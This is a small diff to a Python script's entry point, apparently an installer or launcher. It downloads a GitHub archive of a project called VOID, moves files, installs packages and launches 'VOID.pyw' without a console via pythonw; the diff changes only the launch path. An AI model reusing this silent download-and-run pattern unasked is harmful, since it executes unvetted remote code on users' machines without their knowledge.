@@ -65,4 +65,4 @@ if __name__ == "__main__":
     download_file("https://github.com/TheTrollGodJr/VOID/archive/refs/heads/main.zip")
     transfer_files()
     get_packages()
-    launch_program("VOID/VOID.pyw", [], "pythonw")
+    launch_program("VOID.pyw", [], "pythonw")
